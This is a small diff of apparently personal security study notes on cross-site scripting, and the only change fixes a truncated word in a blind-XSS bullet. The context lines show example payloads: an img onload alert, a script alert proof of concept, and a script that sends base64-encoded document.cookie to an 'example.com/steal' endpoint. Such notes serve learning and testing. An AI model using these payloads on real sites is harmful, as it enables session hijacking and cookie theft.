@@ -193,7 +193,7 @@ Exploit - `/images/valid.png" onload="alert('XSS Detected!')`
 ***
 #### Blind XSS
 - Contact form to staff member
-  - Could reveal portal URL, cookies, r
+  - Could reveal portal URL, cookies, etc
 ### Example Payloads
 - `<script>alert('XSS');</script>` - Proof Of Concept to show XSS attack worked
 - `<script>fetch('https://example.com/steal?cookie=' + btoa(document.cookie));</script>` - Steal user cookie and send it to API
